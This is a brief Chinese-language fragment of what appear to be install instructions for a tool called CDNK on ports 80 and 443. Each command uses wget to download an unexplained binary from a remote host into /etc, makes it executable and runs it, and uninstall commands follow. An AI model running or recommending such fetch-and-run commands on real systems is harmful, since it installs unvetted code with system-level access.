...
### 80口
```
cd /etc && wget https://picgo91.cdn456.eu.org/KY66812/003/CDNK && chmod 744 /etc/CDNK && ./CDNK -q 80 -w 7 -c 3
```
#### 卸载：
```
./etc/CDNK -u
...
```
cd /etc && wget https://picgo91.cdn456.eu.org/KY66812/003/CDNK443 && chmod 744 /etc/CDNK443 && ./CDNK443 -q 443 -w 37 -c 1
```
#### 卸载：
```
./etc/CDNK443 -u
